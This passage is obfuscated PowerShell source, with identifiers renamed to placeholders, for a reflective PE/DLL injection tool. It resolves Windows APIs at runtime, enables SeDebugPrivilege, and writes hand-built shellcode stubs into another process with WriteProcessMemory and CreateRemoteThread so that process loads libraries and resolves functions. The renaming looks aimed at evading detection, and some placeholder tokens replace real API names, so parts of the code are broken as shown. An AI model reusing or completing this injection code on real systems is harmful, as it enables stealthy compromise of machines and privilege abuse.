            $VAR0081 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0079, $VAR0080)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN043 -Value $VAR0081

            $VAR0082 = FUN012 kernel32.dll WaitForSingleObject
            $VAR0083 = FUN011 @([IntPtr], [UInt32]) ([UInt32])
            $VAR0084 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0082, $VAR0083)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN044 -Value $VAR0084

            $VAR0085 = FUN012 kernel32.dll WriteProcessMemory
            $VAR0086 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $VAR0087 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0085, $VAR0086)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN045 -Value $VAR0087

            $VAR0088 = FUN012 kernel32.dll ReadProcessMemory
            $VAR0089 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $VAR0090 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0088, $VAR0089)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN046 -Value $VAR0090

            $VAR0091 = FUN012 kernel32.dll CreateRemoteThread
            $VAR0092 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
            $VAR0093 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0091, $VAR0092)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN047 -Value $VAR0093

            $VAR0094 = FUN012 kernel32.dll GetExitCodeThread
            $VAR0095 = FUN011 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
            $VAR0096 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0094, $VAR0095)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN048 -Value $VAR0096

            $VAR0097 = FUN012 Advapi32.dll OpenThreadToken
            $VAR0098 = FUN011 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
            $VAR0099 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0097, $VAR0098)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN049 -Value $VAR0099

            $VAR0100 = FUN012 kernel32.dll GetCurrentThread
            $VAR0101 = FUN011 @() ([IntPtr])
            $VAR0102 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0100, $VAR0101)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN050 -Value $VAR0102

            $VAR0103 = FUN012 Advapi32.dll AdjustTokenCONST169
            $VAR0104 = FUN011 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
            $VAR0105 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0103, $VAR0104)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN051 -Value $VAR0105

            $VAR0106 = FUN012 Advapi32.dll LookupPrivilegeValueA
            $VAR0107 = FUN011 @([String], [String], [IntPtr]) ([Bool])
            $VAR0108 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0106, $VAR0107)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN052 -Value $VAR0108

            $VAR0109 = FUN012 Advapi32.dll ImpersonateSelf
            $VAR0110 = FUN011 @([Int32]) ([Bool])
            $VAR0111 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0109, $VAR0110)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN053 -Value $VAR0111

            
            if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6, 0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6, 2))) {
                $VAR0112 = FUN012 NtDll.dll NtCreateThreadEx
                $VAR0113 = FUN011 @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
                $VAR0114 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0112, $VAR0113)
                $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN054 -Value $VAR0114
            }

            $VAR0115 = FUN012 Kernel32.dll IsWow64Process
            $VAR0116 = FUN011 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
            $VAR0117 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0115, $VAR0116)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN055 -Value $VAR0117

            $VAR0118 = FUN012 Kernel32.dll CreateThread
            $VAR0119 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
            $VAR0120 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0118, $VAR0119)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN056 -Value $VAR0120

            return $VAR0042
        }
        


   
        Function FUN004 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,

                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )

            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
            [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)

            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                $VAR0124 = 0
                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
                    $Val = $VAR0121Bytes[$i] - $VAR0124
                    
                    if ($Val -lt $VAR0122Bytes[$i]) {
                        $Val += 256
                        $VAR0124 = 1
                    }
                    else {
                        $VAR0124 = 0
                    }

                    [UInt16]$Sum = $Val - $VAR0122Bytes[$i]

                    $VAR0123[$i] = $Sum -band 0x00FF
                }
            }
            else {
                Throw "ERROR01"
            }

            return [BitConverter]::ToInt64($VAR0123, 0)
        }

        Function FUN005 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,

                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )

            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
            [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)

            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                $VAR0124 = 0
                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
                    
                    [UInt16]$Sum = $VAR0121Bytes[$i] + $VAR0122Bytes[$i] + $VAR0124

                    $VAR0123[$i] = $Sum -band 0x00FF

                    if (($Sum -band 0xFF00) -eq 0x100) {
                        $VAR0124 = 1
                    }
                    else {
                        $VAR0124 = 0
                    }
                }
            }
            else {
                Throw "ERROR02"
            }

            return [BitConverter]::ToInt64($VAR0123, 0)
        }

        Function FUN006 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,

                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )

            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)

            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                for ($i = $VAR0121Bytes.Count - 1; $i -ge 0; $i--) {
                    if ($VAR0121Bytes[$i] -gt $VAR0122Bytes[$i]) {
                        return $true
                    }
                    elseif ($VAR0121Bytes[$i] -lt $VAR0122Bytes[$i]) {
                        return $false
                    }
                }
            }
            else {
                Throw "ERROR03"
            }

            return $false
        }


        Function FUN007 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [UInt64]
                $VAR0123
            )

            [Byte[]]$VAR0123Bytes = [BitConverter]::GetBytes($VAR0123)
            return ([BitConverter]::ToInt64($VAR0123Bytes, 0))
        }


        Function FUN008 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                $VAR0123 
            )

            $VAR0123Size = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR0123.GetType()) * 2
            $VAR0124 = "0x{0:X$($VAR0123Size)}" -f [Int64]$VAR0123 

            return $VAR0124
        }

        Function FUN009 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [String]
                $VAR0125,

                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0126,

                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0127,

                [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
                [IntPtr]
                $Size
            )

            [IntPtr]$VAR0128 = [IntPtr](FUN005 ($VAR0127) ($Size))

            $VAR0128 = $VAR0126.CONST038

            
        }

        Function FUN010 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $Bytes,

                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0129
            )

            for ($VAR0130 = 0; $VAR0130 -lt $Bytes.Length; $VAR0130++) {
                [System.Runtime.InteropServices.Marshal]::WriteByte($VAR0129, $VAR0130, $Bytes[$VAR0130])
            }
        }

        
        Function FUN011 {
            Param
            (
                [OutputType([Type])]

                [Parameter( Position = 0)]
                [Type[]]
                $Parameters = (New-Object Type[](0)),

                [Parameter( Position = 1 )]
                [Type]
                $ReturnType = [Void]
            )

            $DoFUN030 = [AppDoFUN030]::CurrentDoFUN030
            $VAR0131 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
            $VAR013 = $DoFUN030.DefineDynamicAssembly($VAR0131, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $VAR014 = $VAR013.DefineDynamicModule('InMemoryModule', $false)
            $VAR011 = $VAR014.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $VAR0132 = $VAR011.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
            $VAR0132.SetImplementationFlags('Runtime, Managed')
            $VAR0133 = $VAR011.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
            $VAR0133.SetImplementationFlags('Runtime, Managed')

            Write-Output $VAR011.CreateType()
        }


        
        Function FUN012 {
            Param
            (
                [OutputType([IntPtr])]

                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                $Module,

                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                $VAR0139
            )

            
            $VAR0134 = [AppDoFUN030]::CurrentDoFUN030.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
            $VAR0135 = $VAR0134.GetType('Microsoft.Win32.UnsafeNativeMethods')

            
            $VAR0075 = $VAR0135.GetMethod('GetModuleHandle')
            $VAR0060 = $VAR0135.GetMethods() | Where { $_.Name -eq "GetProcAddress" } | Select-Object -first 1

            
            $VAR0136 = $VAR0075.Invoke($null, @($Module))

            
            try {
                $VAR0137 = New-Object IntPtr
                $VAR0138 = New-Object System.Runtime.InteropServices.HandleRef($VAR0137, $VAR0136)
                Write-Output $VAR0060.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$VAR0138, $VAR0139))
            }
            catch {
                
                Write-Output $VAR0060.Invoke($null, @($VAR0136, $VAR0139))
            }
        }

        Function FUN013 {
            Param(
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,

                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR010,

                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )

            [IntPtr]$VAR0141 = $VAR0042.FUN050.Invoke()
            if ($VAR0141 -eq [IntPtr]::Zero) {
                Throw "ERROR03"
            }

            [IntPtr]$VAR0142 = [IntPtr]::Zero
            [Bool]$VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
            if ($VAR0144 -eq $false) {
                $VAR0148 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ($VAR0148 -eq $VAR0041.CONST029) {
                    $VAR0144 = $VAR0042.FUN053.Invoke(3)
                    if ($VAR0144 -eq $false) {
                        Throw "ERROR04"
                    }

                    $VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
                    if ($VAR0144 -eq $false) {
                        Throw "ERROR05"
                    }
                }
                else {
                    Throw "ERROR06: $VAR0148"
                }
            }

            [IntPtr]$VAR0143 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST163))
            $VAR0144 = $VAR0042.FUN052.Invoke($null, "SeDebugPrivilege", $VAR0143)
            if ($VAR0144 -eq $false) {
                Throw "ERROR07"
            }

            [UInt32]$VAR0145 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST167)
            [IntPtr]$VAR0146 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0145)
            $VAR0147 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0146, [Type]$VAR010.CONST167)
            $VAR0147.CONST168 = 1
            $VAR0147.CONST169.CONST163 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0143, [Type]$VAR010.CONST163)
            $VAR0147.CONST169.Attributes = $VAR0041.CONST028
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0147, $VAR0146, $true)

            $VAR0144 = $VAR0042.FUN051.Invoke($VAR0142, $false, $VAR0146, $VAR0145, [IntPtr]::Zero, [IntPtr]::Zero)
            $VAR0148 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
            if (($VAR0144 -eq $false) -or ($VAR0148 -ne 0)) {
                
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0146)
        }

        Function FUN014 {
            Param(
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0151,

                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0127,

                [Parameter(Position = 3, Mandatory = $false)]
                [IntPtr]
                $VAR0152 = [IntPtr]::Zero,

                [Parameter(Position = 4, Mandatory = $true)]
                [System.Object]
                $VAR0042
            )

            [IntPtr]$VAR0149 = [IntPtr]::Zero

            $VAR0150 = [Environment]::OSVersion.Version
            
            if (($VAR0150 -ge (New-Object 'Version' 6, 0)) -and ($VAR0150 -lt (New-Object 'Version' 6, 2))) {
                
                $RetVal = $VAR0042.FUN054.Invoke([Ref]$VAR0149, 0x1FFFFF, [IntPtr]::Zero, $VAR0151, $VAR0127, $VAR0152, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
                $VAR0153 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ($VAR0149 -eq [IntPtr]::Zero) {
                    Throw "ERROR63: $RetVal. $VAR0153"
                }
            }
            
            else {
                
                $VAR0149 = $VAR0042.FUN047.Invoke($VAR0151, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $VAR0127, $VAR0152, 0, [IntPtr]::Zero)
            }

            if ($VAR0149 -eq [IntPtr]::Zero) {
                Write-Error "ERROR64" -ErrorAction Stop
            }

            return $VAR0149
        }

        Function FUN015 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,

                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010
            )

            $VAR0154 = New-Object System.Object

            
            $VAR0155 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0263, [Type]$VAR010.CONST123)

            
            [IntPtr]$VAR0156 = [IntPtr](FUN005 ([Int64]$VAR0263) ([Int64][UInt64]$VAR0155.CONST141))
            $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST030 -Value $VAR0156
            $VAR0157 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0156, [Type]$VAR010.CONST03164)

            
            if ($VAR0157.Signature -ne 0x00004550) {
                throw "ERROR65"
            }

            if ($VAR0157.CONST122.Magic -eq 'CONST101') {
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0157
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $true
            }
            else {
                $VAR0158 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0156, [Type]$VAR010.CONST03132)
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0158
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $false
            }

            return $VAR0154
        }


        
        Function FUN016 {
            Param(
                [Parameter( Position = 0, Mandatory = $true )]
                [Byte[]]
                $VAR001,

                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010
            )

            $VAR0126 = New-Object System.Object

            
            [IntPtr]$VAR0159 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR001.Length)
            [System.Runtime.InteropServices.Marshal]::Copy($VAR001, 0, $VAR0159, $VAR001.Length) | Out-Null

            
            $VAR0154 = FUN015 -VAR0263 $VAR0159 -VAR010 $VAR010

            
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0196' -Value ($VAR0154.CONST031.CONST122.CONST058)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST034' -Value ($VAR0154.CONST031.CONST122.CONST034)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST035' -Value ($VAR0154.CONST031.CONST122.CONST035)

            
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0159)

            return $VAR0126
        }


        
        
        Function FUN017 {
            Param(
                [Parameter( Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,

                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010,

                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )

            if ($VAR0263 -eq $null -or $VAR0263 -eq [IntPtr]::Zero) {
                throw 'ERROR66'
            }

            $VAR0126 = New-Object System.Object

            
            $VAR0154 = FUN015 -VAR0263 $VAR0263 -VAR010 $VAR010

            
            $VAR0126 | Add-Member -MemberType NoteProperty -Name VAR0263 -Value $VAR0263
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST031 -Value ($VAR0154.CONST031)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST100 -Value ($VAR0154.CONST100)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST032 -Value ($VAR0154.CONST032)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)

            if ($VAR0126.CONST032 -eq $true) {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST100) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03164)))
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
            }
            else {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST100) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03132)))
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
            }

            if (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST022) -eq $VAR0041.CONST022) {
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Library'
            }
            elseif (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST021) -eq $VAR0041.CONST021) {
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Executable'
            }
            else {
                Throw "ERROR08"
            }

            return $VAR0126
        }

        Function FUN018 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0161,

                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0162
            )

            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

            $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0162)
            $VAR0165 = [UIntPtr][UInt64]([UInt64]$VAR0164.Length + 1)
            $VAR0166 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
            if ($VAR0166 -eq [IntPtr]::Zero) {
                Throw "ERROR09"
            }

            [UIntPtr]$VAR0167 = [UIntPtr]::Zero
            $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0166, $VAR0162, $VAR0165, [Ref]$VAR0167)

            if ($Success -eq $false) {
                Throw "ERROR10"
            }
            if ($VAR0165 -ne $VAR0167) {
                Throw "ERROR11"
            }

            $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
            $VAR0169 = $VAR0042.FUN036.Invoke($VAR0168, "LoadLibraryA") 

            [IntPtr]$VAR0181 = [IntPtr]::Zero
            
            
            if ($VAR0126.CONST032 -eq $true) {
                
                $VAR0170 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
                if ($VAR0170 -eq [IntPtr]::Zero) {
                    Throw "ERROR12"
                }

                
                $VAR0174 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
                $VAR0175 = @(0x48, 0xba)
                $VAR0176 = @(0xff, 0xd2, 0x48, 0xba)
                $VAR0177 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

                $VAR0171 = $VAR0174.Length + $VAR0175.Length + $VAR0176.Length + $VAR0177.Length + ($VAR0163 * 3)
                $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
                $VAR0173 = $VAR0172

                FUN010 -Bytes $VAR0174 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0174.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0166, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                FUN010 -Bytes $VAR0175 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0175.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0169, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                FUN010 -Bytes $VAR0176 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0176.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0170, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                FUN010 -Bytes $VAR0177 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0177.Length)

                $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
                if ($VAR0178 -eq [IntPtr]::Zero) {
                    Throw "ERROR13"
                }

                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
                if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                    Throw "ERROR14"
                }

                $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
                $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                if ($VAR0144 -ne 0) {
                    Throw "ERROR15"
                }

                
                [IntPtr]$VAR0180 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
                $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0170, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
                if ($VAR0144 -eq $false) {
                    Throw "ERROR16"
                }
                [IntPtr]$VAR0181 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0180, [Type][IntPtr])

                $VAR0042.FUN039.Invoke($VAR0161, $VAR0170, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
                $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
            }
            else {
                [IntPtr]$VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0169 -ArgumentPtr $VAR0166 -VAR0042 $VAR0042
                $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                if ($VAR0144 -ne 0) {
                    Throw "ERROR17."
                }

                [Int32]$VAR0182 = 0
                $VAR0144 = $VAR0042.FUN048.Invoke($VAR0179, [Ref]$VAR0182)
                if (($VAR0144 -eq 0) -or ($VAR0182 -eq 0)) {
                    Throw "ERROR18"
                }

                [IntPtr]$VAR0181 = [IntPtr]$VAR0182
            }

            $VAR0042.FUN039.Invoke($VAR0161, $VAR0166, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null

            return $VAR0181
        }

        Function FUN019 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0161,

                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0183,

                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0184, 

                [Parameter(Position = 3, Mandatory = $true)]
                [Bool]
                $VAR0185
            )

            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

            [IntPtr]$VAR0186 = [IntPtr]::Zero   
            
            if (-not $VAR0185) {
                $VAR0187 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0184)

                
                $VAR0188 = [UIntPtr][UInt64]([UInt64]$VAR0187.Length + 1)
                $VAR0186 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0188, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
                if ($VAR0186 -eq [IntPtr]::Zero) {
                    Throw "ERROR17"
                }

                [UIntPtr]$VAR0167 = [UIntPtr]::Zero
                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0186, $VAR0184, $VAR0188, [Ref]$VAR0167)
                if ($Success -eq $false) {
                    Throw "ERROR18"
                }
                if ($VAR0188 -ne $VAR0167) {
                    Throw "ERROR19"
                }
            }
            
            else {
                $VAR0186 = $VAR0184
            }

            
            $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
            $VAR0058 = $VAR0042.FUN036.Invoke($VAR0168, "GetProcAddress") 

            
            $VAR0189 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UInt64][UInt64]$VAR0163, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
            if ($VAR0189 -eq [IntPtr]::Zero) {
                Throw "ERROR20"
            }

            
            
            [Byte[]]$VAR0190 = @()
            if ($VAR0126.CONST032 -eq $true) {
                $VAR01901 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
                $VAR01902 = @(0x48, 0xba)
                $VAR01903 = @(0x48, 0xb8)
                $VAR01904 = @(0xff, 0xd0, 0x48, 0xb9)
                $VAR01905 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            }
            else {
                $VAR01901 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
                $VAR01902 = @(0xb9)
                $VAR01903 = @(0x51, 0x50, 0xb8)
                $VAR01904 = @(0xff, 0xd0, 0xb9)
                $VAR01905 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
            }
            $VAR0171 = $VAR01901.Length + $VAR01902.Length + $VAR01903.Length + $VAR01904.Length + $VAR01905.Length + ($VAR0163 * 4)
            $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
            $VAR0173 = $VAR0172

            FUN010 -Bytes $VAR01901 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01901.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0183, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01902 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01902.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0186, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01903 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01903.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0058, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01904 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01904.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0189, $VAR0172, $false)
